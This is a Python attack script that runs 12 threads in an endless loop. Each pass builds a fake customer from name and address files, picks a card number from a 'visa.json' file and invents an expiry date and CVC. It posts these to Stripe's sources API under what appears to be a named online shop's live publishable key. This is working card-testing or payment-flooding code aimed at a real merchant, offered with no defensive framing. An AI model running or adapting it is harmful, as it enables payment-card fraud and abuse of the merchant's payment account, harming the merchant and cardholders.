import requests
import json
import random
import threading

num_threads = 12

# url = 'https://levelino.com/en-cp/checkouten/'
# POST_URL = 'https://levelino.com/en-cp/?wc-ajax=checkout'

def do_request():
    while True:
        rand = random.randint(0, 49)
        with open('last_names.txt') as f:
            last_name = f.readlines()[rand].strip('\n')
        rand = random.randint(0, 99)
        with open('first_names.txt') as f:
            first_name = f.readlines()[rand].strip('\n')
        with open('visa.json') as f:
            data = json.load(f)
            rand = random.randint(0, len(data) - 1)
            random_CC = (data[rand]["CreditCard"]["CardNumber"])

        with open('addresses.json') as f:
            data = json.load(f)
            rand = random.randint(0, len(data) - 1)
            address = (data[rand]["address"])
            city    = (data[rand]["city"])
            state   = (data[rand]["state"])
            zip     = (data[rand]["zip"])

        rand_email = random.randint(1969, 2000)
        exp_month = random.randint(1, 9)
        exp_year = random.randint(22, 36)
        cvc = random.randint(100, 999)

        separator = [".", "-", "_"]
        email_service = ["gmail.com", "yahoo.com", "sympatico.com", "hotmail.com", "outlook.com"]
        rand_separator = random.randint(0, 2)
        rand_service = random.randint(0, 4)
        email_address = f"{first_name.lower()}{separator[rand_separator]}{last_name.lower()}{rand_email}@{email_service[rand_service]}"


        credit_card_form = {
        'type' : 'card',
        'owner[name]' : f'{first_name} {last_name}',
        'owner[address][line1]' : f'{address}',
        'owner[address][city]' : f'{city}',
        'owner[address][postal_code]' : f'{zip}',
        'owner[email]' : f'{email_address}',
        'card[number]' : f'{random_CC}',
        'card[cvc]' : f'{cvc}',
        'card[exp_month]' : f'{exp_month}',
        'card[exp_year]' : f'{exp_year}',
        'guid' : 'c2a03b6b-e09a-47e7-80bf-204f79e4582b22360f',
        'muid' : 'ac6e2e99-c9a1-443c-8f8f-d7922464a371472615',
        'sid' : 'bc3172b5-628a-42fb-ab5a-ca0a46ccfe5d6a5c22',
        'pasted_fields' : 'number',
        'payment_user_agent' : 'stripe.js/20815df15; stripe-js-v3/20815df15',
        'time_on_page' : '25654',
        'referrer' : 'https://levelino.com/',
        'key' : 'pk_live_51J7dyBF3Lg5e0rxJkIs61LE6EAVk7YE34PB55mI2xi9tzjclgXXM1MX95dEaxMFiR9mnFCeOH4FiX2edxGtMGpIw00lacmkHXM'
        }
        cc_url = 'https://api.stripe.com/v1/sources'

        response = requests.post(cc_url, data=credit_card_form).text

        # print(response)

threads = []
for i in range(num_threads):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(num_threads):
    threads[i].start()

for i in range(num_threads):
    threads[i].join()
